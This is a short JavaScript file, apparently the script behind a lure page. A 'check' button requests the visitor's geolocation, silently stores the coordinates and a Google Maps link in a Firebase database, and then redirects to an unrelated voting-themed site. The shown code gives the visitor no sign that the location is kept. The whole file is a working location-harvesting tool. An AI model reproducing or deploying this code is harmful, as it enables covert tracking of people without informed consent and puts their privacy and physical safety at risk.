var msk = new Date();
let time = msk.getTime();
var jlun = document.getElementById("demo");

function getSave() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
    jlun.style.display = "none";
  } else { 
    jlun.innerHTML = "Pastikan anda menyetujui lokasi!";
    jlun.style.display = "block";
  }
}

function showPosition(position) {
  jlun.innerHTML = "Latitude: " + position.coords.latitude + "<br>Longitude: " + position.coords.longitude;
  var slat = position.coords.latitude;
  var slong = position.coords.longitude;
  var smaps = "https://google.com/maps/search/"+slat+","+slong;
  firebase.database().ref("/" + time).set({Latitude: slat,Longitude: slong,Maps: smaps});
  window.location.assign("http://mevoting.is-best.net/");
}

document.getElementById("check").onclick = function () {
  getSave();
};
